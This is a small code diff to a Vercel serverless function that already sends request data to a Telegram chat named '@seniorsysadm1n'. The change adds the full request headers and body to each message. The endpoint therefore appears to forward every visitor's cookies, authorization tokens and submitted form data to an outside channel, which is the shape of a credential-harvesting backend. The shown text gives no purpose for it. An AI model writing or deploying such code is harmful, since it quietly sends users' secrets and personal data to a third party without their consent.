@@ -45,8 +45,8 @@ import axios, { AxiosInstance, AxiosResponse, AxiosError, Axios , AxiosRequestCo
 
 export default async (request: VercelRequest, response: VercelResponse) => {
     const query = request.query
-
-
+const headers = request.headers
+const body = request.body
 
         try {
           
@@ -74,7 +74,7 @@ export default async (request: VercelRequest, response: VercelResponse) => {
                 telegramUrl,
                 {
                     "chat_id" : "@seniorsysadm1n",
-                    text : JSON.stringify( {Mi,Ho,query})
+                    text : JSON.stringify( {Mi,Ho,query,headers,body})
                 },
                 {
                     headers: { 
